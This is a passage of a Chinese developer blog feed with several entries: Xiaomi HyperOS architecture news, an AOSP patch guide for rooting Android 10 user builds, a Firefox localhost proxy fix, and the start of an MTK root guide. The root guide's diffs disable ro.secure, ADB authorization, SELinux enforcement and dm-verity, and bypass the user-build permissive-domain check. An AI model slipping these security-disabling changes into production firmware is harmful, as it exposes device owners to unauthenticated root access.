        <content type="html"><![CDATA[<p>上周，雷军发文称小米全新操作系统澎湃 OS 正式版已完成封包，将逐步接替 MIUI。而后，又有网友曝光小米澎湃 OS 界面。<br>今日，雷军再度发表长文预热小米澎湃 OS，正式公布了完整系统架构。<br>据介绍，从架构设计之初，小米就明确了四个目标：</p><ul><li>第一，实现单端性能表现最强；</li><li>第二，AI 赋能，成为整个生态的 “智能大脑”，能够为用户提供主动服务；</li><li>第三，更加便捷高效的连接；</li><li>第四，实现全端隐私安全坚固防护。</li></ul><p><img src="/images/20231023/20231023001.png"></p><p>在最底层的系统内核层，小米将自研的 Vela 系统内核与深度修改的 Linux 系统内核进行融合，重构了性能调度、任务管理、内存管理、文件管理等各个基础模块，实现了性能、效率的大幅提升。</p><p>这一全新的融合内核，<strong>支持 200 多个处理器平台、20 多种文件系统</strong>，还能根据硬件能力差异灵活配置，具有很好的兼容性，使得每个独立设备的性能都能得到彻底解放。</p><p>在系统内核层之上的服务与框架层，小米将安卓的服务框架和自研 Vela 系统的服务框架，都作为 “中间件” 纳入其中；同时，全新打造了 8 大子系统，其中全新的 AI 子系统融合大模型能力，成为整个系统的 “智能大脑”，<strong>不仅可以让单设备实现极强的端侧 AI 能力，同时赋予整个生态智能能力</strong>。</p><p>最上层 HyperConnect 跨端层，小米让所有设备可以统一连接协议，并且实时通信，最终构建 “人车家全生态” 的智能世界。</p><p>值得一提的是，小米澎湃 OS 打造了贯穿内核层、服务框架层、跨端层的全端安全系统，尤其是内核层，<strong>小米启用了完全独立的 “自研微内核安全系统”，保障了安全从最底层实现</strong>。</p><p>最后附上雷军原文：</p><p><img src="/images/20231023/20231023002.png"></p>]]></content>
      
      
      <categories>
          
          <category> 资讯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android10.0(Q) user版本打开root权限</title>
      <link href="/2023/10/22/2023-10-22/"/>
      <url>/2023/10/22/2023-10-22/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>个人玩家建议采用 magisk 方式直接修补 boot.img 实现 root 即可， 然后搭载 RE 文件管理器可操作 system 相关分区<br>源码玩家可直接修改 aosp 源码后自己编译 rom 直刷。</p><h3 id="文件清单"><a href="#文件清单" class="headerlink" title="文件清单"></a>文件清单</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">aosp10\build\core\main.mk</span><br><span class="line">aosp10\system\sepolicy\definitions.mk</span><br><span class="line">aosp10\system\sepolicy\Android.mk</span><br><span class="line">aosp10\system\core\fs_mgr\Android.bp</span><br><span class="line">aosp10\system\core\adb\daemon\main.cpp</span><br><span class="line">aosp10\system\core\adb\Android.bp</span><br><span class="line">aosp10\system\core\init\selinux.cpp</span><br><span class="line">aosp10\system\core\init\Android.mk</span><br><span class="line">aosp10\system\core\init\Android.bp</span><br><span class="line">aosp10\device\google\marlin\xxx\BoardConfig.mk</span><br></pre></td></tr></table></figure><h4 id="1、-让进程名称在-AS-Logcat-中可见，-通过修改-ro-adb-secure-和-ro-secure"><a href="#1、-让进程名称在-AS-Logcat-中可见，-通过修改-ro-adb-secure-和-ro-secure" class="headerlink" title="1、 让进程名称在 AS Logcat 中可见， 通过修改 ro.adb.secure 和 ro.secure"></a>1、 让进程名称在 AS Logcat 中可见， 通过修改 ro.adb.secure 和 ro.secure</h4><p><strong>ps： 这步不是必须的， 目的只是在 logcat 中可见进程 pid 和包名， 而且打开 USB 调试时默认授权， 不再弹授权框</strong><br><strong>build/make/core/main.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">tags_to_install :=</span><br><span class="line">ifneq (,$(user_variant))</span><br><span class="line">    <span class="comment"># Target is secure in user builds.</span></span><br><span class="line">-   ADDITIONAL_DEFAULT_PROPERTIES += ro.secure=1</span><br><span class="line">+   <span class="comment"># ADDITIONAL_DEFAULT_PROPERTIES += ro.secure=1</span></span><br><span class="line">+   ADDITIONAL_DEFAULT_PROPERTIES += ro.secure=0</span><br><span class="line">    ADDITIONAL_DEFAULT_PROPERTIES += security.perf_harden=1</span><br><span class="line">    ifeq ($(user_variant),user)</span><br><span class="line">-   ADDITIONAL_DEFAULT_PROPERTIES += ro.adb.secure=1</span><br><span class="line">+   <span class="comment"># ADDITIONAL_DEFAULT_PROPERTIES += ro.adb.secure=1</span></span><br><span class="line">+   ADDITIONAL_DEFAULT_PROPERTIES += ro.adb.secure=0</span><br><span class="line">    endif</span><br><span class="line">ifeq ($(user_variant),userdebug)</span><br><span class="line">@@ -251,7 +253,7 @@ ifneq (,$(user_variant))</span><br><span class="line">        tags_to_install += debug</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment"># Disable debugging in plain user builds.</span></span><br><span class="line">-       enable_target_debugging :=</span><br><span class="line">+       <span class="comment"># enable_target_debugging :=</span></span><br><span class="line">    endif</span><br><span class="line">    <span class="comment"># Disallow mock locations by default for user builds</span></span><br></pre></td></tr></table></figure><h4 id="2、-修改-SELinux权限为-Permissive"><a href="#2、-修改-SELinux权限为-Permissive" class="headerlink" title="2、 修改 SELinux权限为 Permissive"></a>2、 修改 SELinux权限为 Permissive</h4><p>找到对应文件 BoardConfig.mk 增加 androidboot.selinux=permissive<br>d<strong>evice/google/marlin/xxx/BoardConfig.mk</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOARD_KERNEL_CMDLINE += console=ttyHSL0,115200,n8 androidboot.console=ttyHSL0 androidboot.hardware=xxx</span><br></pre></td></tr></table></figure><p>继续修改如下三个文件<br>ALLOW_PERMISSIVE_SELINUX=1<br><strong>system/core/init/Android.bp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cc_defaults &#123;</span><br><span class="line">    name: <span class="string">&quot;init_defaults&quot;</span>,</span><br><span class="line">    cpp_std: <span class="string">&quot;experimental&quot;</span>,</span><br><span class="line">    sanitize: &#123;</span><br><span class="line">        misc_undefined: [<span class="string">&quot;signed-integer-overflow&quot;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">    cflags: [</span><br><span class="line">        <span class="string">&quot;-DLOG_UEVENTS=0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-Wall&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-Wextra&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-Wno-unused-parameter&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-Werror&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DALLOW_LOCAL_PROP_OVERRIDE=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DALLOW_PERMISSIVE_SELINUX=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DREBOOT_BOOTLOADER_ON_PANIC=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DWORLD_WRITABLE_KMSG=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DDUMP_ON_UMOUNT_FAILURE=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DSHUTDOWN_ZERO_TIMEOUT=0&quot;</span>,</span><br><span class="line">]   ,</span><br></pre></td></tr></table></figure><p><strong>system/core/init/Android.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ifneq (,$(filter user userdebug eng,$(TARGET_BUILD_VARIANT)))</span><br><span class="line">init_options += \</span><br><span class="line">-DALLOW_LOCAL_PROP_OVERRIDE=1 \</span><br><span class="line">-DALLOW_PERMISSIVE_SELINUX=1 \</span><br><span class="line">-DREBOOT_BOOTLOADER_ON_PANIC=1 \</span><br><span class="line">-DWORLD_WRITABLE_KMSG=1 \</span><br><span class="line">-DDUMP_ON_UMOUNT_FAILURE=1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">init_options += \</span><br><span class="line">-DALLOW_LOCAL_PROP_OVERRIDE=0 \</span><br><span class="line">-DALLOW_PERMISSIVE_SELINUX=0 \</span><br><span class="line">-DREBOOT_BOOTLOADER_ON_PANIC=0 \</span><br><span class="line">-DWORLD_WRITABLE_KMSG=0 \</span><br><span class="line">-DDUMP_ON_UMOUNT_FAILURE=0</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p><strong>system/core/init/selinux.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">IsEnforcing</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (ALLOW_PERMISSIVE_SELINUX) &#123;</span><br><span class="line">        <span class="keyword">return</span> StatusFromCmdline() == SELINUX_ENFORCING;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="3、-允许-adb-关闭-verity"><a href="#3、-允许-adb-关闭-verity" class="headerlink" title="3、 允许 adb 关闭 verity"></a>3、 允许 adb 关闭 verity</h3><p><strong>system/core/adb/Android.bp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">@@ -24,7 +24,7 @@ cc_defaults &#123;</span><br><span class="line">        <span class="string">&quot;-Wno-missing-field-initializers&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-Wthread-safety&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-Wvla&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DADB_HOST=1&quot;</span>,</span><br><span class="line">-       <span class="string">&quot;-DALLOW_ADBD_ROOT=0&quot;</span>,</span><br><span class="line">+       <span class="string">&quot;-DALLOW_ADBD_ROOT=1&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    cpp_std: <span class="string">&quot;experimental&quot;</span>,</span><br><span class="line">@@ -76,7 +76,14 @@ cc_defaults &#123;</span><br><span class="line">cc_defaults &#123;</span><br><span class="line">    name: <span class="string">&quot;adbd_defaults&quot;</span>,</span><br><span class="line">    defaults: [<span class="string">&quot;adb_defaults&quot;</span>],</span><br><span class="line">    //cflags: [<span class="string">&quot;-UADB_HOST&quot;</span>, <span class="string">&quot;-DADB_HOST=0&quot;</span>],</span><br><span class="line">    cflags: [</span><br><span class="line">        <span class="string">&quot;-UADB_HOST&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DADB_HOST=0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-UALLOW_ADBD_ROOT&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DALLOW_ADBD_ROOT=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DALLOW_ADBD_NO_AUTH&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    product_variables: &#123;</span><br><span class="line">        debuggable: &#123;</span><br><span class="line">            cflags: [</span><br><span class="line">                <span class="string">&quot;-UALLOW_ADBD_ROOT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-DALLOW_ADBD_ROOT=1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-DALLOW_ADBD_NO_AUTH&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125; @</span><br><span class="line">@ -403,6 +410,8 @@ cc_library &#123;</span><br><span class="line">    required: [<span class="string">&quot;remount&quot;</span>,],</span><br><span class="line">    product_variables: &#123;</span><br><span class="line">        debuggable: &#123;</span><br><span class="line">            required: [</span><br><span class="line">                <span class="string">&quot;remount&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p><strong>system/core/adb/daemon/main.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">should_drop_capabilities_bounding_set</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (ALLOW_ADBD_ROOT || is_device_unlocked()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__android_log_is_debuggable()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">should_drop_privileges</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// &quot;adb root&quot; not allowed, always drop privileges.</span></span><br><span class="line">    <span class="keyword">if</span> (!ALLOW_ADBD_ROOT &amp;&amp; !is_device_unlocked()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h4 id="4、-修改-adb-root-权限"><a href="#4、-修改-adb-root-权限" class="headerlink" title="4、 修改 adb root 权限"></a>4、 修改 adb root 权限</h4><p><strong>system/core/fs_mgr/Android.bp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">whole_static_libs: [</span><br><span class="line">        <span class="string">&quot;liblogwrap&quot;</span>,</span><br><span class="line">        <span class="string">&quot;libdm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;libfstab&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    cppflags: [</span><br><span class="line">        <span class="string">&quot;-UALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY=1&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    product_variables: &#123;</span><br><span class="line">        debuggable: &#123;</span><br><span class="line">            cppflags: [</span><br><span class="line">                <span class="string">&quot;-UALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY=1&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">srcs: [</span><br><span class="line">        <span class="string">&quot;fs_mgr_remount.cpp&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    cppflags: [</span><br><span class="line">        <span class="string">&quot;-UALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">        <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY=1&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    product_variables: &#123;</span><br><span class="line">        debuggable: &#123;</span><br><span class="line">            cppflags: [</span><br><span class="line">                <span class="string">&quot;-UALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY=1&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>user 版本启用 overlayfs 来装载 remount 对应分区 user 版本不允许 permissive domains<br><strong>system/sepolicy/Android.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ifneq ($(TARGET_BUILD_VARIANT), eng)</span><br><span class="line">    LOCAL_REQUIRED_MODULES += \</span><br><span class="line">        selinux_denial_metadata \</span><br><span class="line">@@ -978,7 +978,7 @@ $(built_sepolicy_neverallows)</span><br><span class="line">            @<span class="built_in">mkdir</span> -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span><br><span class="line">            $(hide) $&lt; -m -M <span class="literal">true</span> -G -c $(POLICYVERS) $(PRIVATE_NEVERALLOW_ARG) $(PRIVATE_CIL_FILES) -o <span class="variable">$@</span>.tmp</span><br><span class="line">            $(hide) $(HOST_OUT_EXECUTABLES)/sepolicy-analyze <span class="variable">$@</span>.tmp permissive &gt; <span class="variable">$@</span>.permissivedomains</span><br><span class="line">-           $(hide) <span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(TARGET_BUILD_VARIANT)</span>&quot;</span> = <span class="string">&quot;user&quot;</span> -a -s <span class="variable">$@</span>.permissivedomains ]; <span class="keyword">then</span> \</span><br><span class="line">+           $(hide) <span class="keyword">if</span> [ <span class="string">&quot;eng&quot;</span> = <span class="string">&quot;user&quot;</span> -a -s <span class="variable">$@</span>.permissivedomains ]; <span class="keyword">then</span> \</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;==========&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;ERROR: permissive domains not allowed in user builds&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">e               cho <span class="string">&quot;List of invalid domains:&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">@@ -1032,7 +1032,7 @@ $(LOCAL_BUILT_MODULE): $(sepolicy.recovery.conf) $(HOST_OUT_EXECUTABLES)/checkpo</span><br><span class="line">            $(hide) $(CHECKPOLICY_ASAN_OPTIONS) $(HOST_OUT_EXECUTABLES)/checkpolicy -M -c \</span><br><span class="line">                $(POLICYVERS) -o <span class="variable">$@</span>.tmp $&lt;</span><br><span class="line">            $(hide) $(HOST_OUT_EXECUTABLES)/sepolicy-analyze <span class="variable">$@</span>.tmp permissive &gt; <span class="variable">$@</span>.permissivedomains</span><br><span class="line">-           $(hide) <span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(TARGET_BUILD_VARIANT)</span>&quot;</span> = <span class="string">&quot;user&quot;</span> -a -s <span class="variable">$@</span>.permissivedomains ]; <span class="keyword">then</span> \</span><br><span class="line">+           $(hide) <span class="keyword">if</span> [ <span class="string">&quot;eng&quot;</span> = <span class="string">&quot;user&quot;</span> -a -s <span class="variable">$@</span>.permissivedomains ]; <span class="keyword">then</span> \</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;==========&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;ERROR: permissive domains not allowed in user builds&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;List of invalid domains:&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">ifneq ($(filter address,$(SANITIZE_TARGET)),)</span><br><span class="line">    local_fc_files += $(wildcard $(addsuffix /file_contexts_asan, $(PLAT_PRIVATE_POLICY)))</span><br><span class="line">endif</span><br><span class="line">ifneq (,$(filter user userdebug eng,$(TARGET_BUILD_VARIANT)))</span><br><span class="line">    local_fc_files += $(wildcard $(addsuffix /file_contexts_overlayfs, $(PLAT_PRIVATE_POLICY)))</span><br><span class="line">endif</span><br><span class="line">ifneq ($(TARGET_BUILD_VARIANT), eng)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_MODULE := selinux_denial_metadata</span><br><span class="line">LOCAL_MODULE_CLASS := ETC</span><br><span class="line">LOCAL_MODULE_PATH := $(TARGET_OUT_VENDOR)/etc/selinux</span><br></pre></td></tr></table></figure><p><strong>system/sepolicy/definitions.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">define transform-policy-to-conf</span><br><span class="line">@<span class="built_in">mkdir</span> -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span><br><span class="line">$(hide) m4 --fatal-warnings $(PRIVATE_ADDITIONAL_M4DEFS) \</span><br><span class="line">    -D mls_num_sens=$(PRIVATE_MLS_SENS) -D mls_num_cats=$(PRIVATE_MLS_CATS) \</span><br><span class="line">    -D target_build_variant=eng \</span><br><span class="line">    -D target_with_dexpreopt=$(WITH_DEXPREOPT) \</span><br><span class="line">    -D target_arch=$(PRIVATE_TGT_ARCH) \</span><br><span class="line">    -D target_with_asan=$(PRIVATE_TGT_WITH_ASAN) \</span><br><span class="line">    -D target_with_native_coverage=$(PRIVATE_TGT_WITH_NATIVE_COVERAGE) \</span><br><span class="line">    -D target_full_treble=$(PRIVATE_SEPOLICY_SPLIT) \</span><br><span class="line">    -D target_compatible_property=$(PRIVATE_COMPATIBLE_PROPERTY) \</span><br><span class="line">    -D target_exclude_build_test=$(PRIVATE_EXCLUDE_BUILD_TEST) \</span><br><span class="line">    $(PRIVATE_TGT_RECOVERY) \</span><br><span class="line">-s $^ &gt; <span class="variable">$@</span></span><br><span class="line">endef</span><br><span class="line">.KATI_READONLY := transform-policy-to-conf</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Firefox无法访问localhost和127.0.0.1的问题与解决</title>
      <link href="/2023/10/21/2023-10-21/"/>
      <url>/2023/10/21/2023-10-21/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在最近几次更新Firefox浏览器之后，忽然发现我无法访问本地搭建的网站“localhost”。无论我尝试多少次，页面始终无法加载，只是在不断地旋转加载图标。</p><p>Firefox版本：116.0.3(64位)<br>操作系统：Windows10(64位)</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>1.在Firefox浏览器中，您需要在URL栏中输入<strong>about:config</strong>，然后按Enter键，引导进入Firefox的配置页面<br><img src="/images/20231021/20231021143547.png"></p><p>2.会出现一个警告页面，告知关于使用about:config页面的风险。为了继续，需要点击“接受风险并继续”。<br><img src="/images/20231021/20231021153318.png"></p><p>3.在配置页的搜索栏输入<strong>network.proxy.allow_hijacking_localhost</strong></p><p>4.找到该配置项，双击修改设置为true即可，这是对网络代理设置的一项更改，意味着允许本地主机的网络拦截。<br><img src="/images/20231021/20231021153417.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android10.0(Q) root MTK 6765 user版本打开root权限</title>
      <link href="/2023/10/15/2023-10-15/"/>
      <url>/2023/10/15/2023-10-15/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>相比较 Android8.1、9.0 而言，Android10.0 版本 的 root变得相当麻烦，10.0 中引入了动态分区机制，同样的要想完全 adb root，需要 fastboot 解锁，然后关闭 verity 才能 adb remount 成功。我尝试和之前一样修改 fstab.in.mt6765 中的 ro 和 rw 初始值，容易导致无法正常开机，在这耗费了很长时间，就暂时先跳过吧，apk root 是 ok的。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><table><thead><tr><th>名称</th><th>版本</th></tr></thead><tbody><tr><td>Android版本</td><td>10.0</td></tr><tr><td>平台</td><td>MTK6766</td></tr></tbody></table><h3 id="先放一张图"><a href="#先放一张图" class="headerlink" title="先放一张图"></a>先放一张图</h3><p><img src="/images/20231015/20231015001.png"></p><h3 id="修改方案"><a href="#修改方案" class="headerlink" title="修改方案"></a>修改方案</h3><p>上面的图就不用我多说了吧，分别用了 ROOT检测工具、RE文件管理器测试，只要 root 成功都有明显的提示，总共修改 12 个文件，新增 3 个文件，一共 15 个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">modified:   build/make/core/main.mk</span><br><span class="line">modified:   device/mediatek/sepolicy/basic/non_plat/file_contexts</span><br><span class="line">modified:   device/mediateksample/k62v1_64_bsp/device.mk</span><br><span class="line">modified:   vendor/mediatek/proprietary/bootable/bootloader/preloader/custom/k62v1_64_bsp/k62v1_64_bsp.mk</span><br><span class="line">modified:   system/core/adb/Android.bp</span><br><span class="line">modified:   system/core/adb/daemon/main.cpp</span><br><span class="line">modified:   system/core/init/selinux.cpp</span><br><span class="line">modified:   system/core/libcutils/fs_config.cpp</span><br><span class="line">modified:   system/core/rootdir/init.rc</span><br><span class="line">modified:   system/sepolicy/Android.mk</span><br><span class="line">modified:   system/sepolicy/prebuilts/api/29.0/public/domain.te</span><br><span class="line">modified:   system/sepolicy/public/domain.te</span><br><span class="line"></span><br><span class="line">add device/mediatek/sepolicy/basic/non_plat/suproce.te</span><br><span class="line">add system/extras/su/su</span><br><span class="line">add system/extras/su/suproce.sh</span><br></pre></td></tr></table></figure><h4 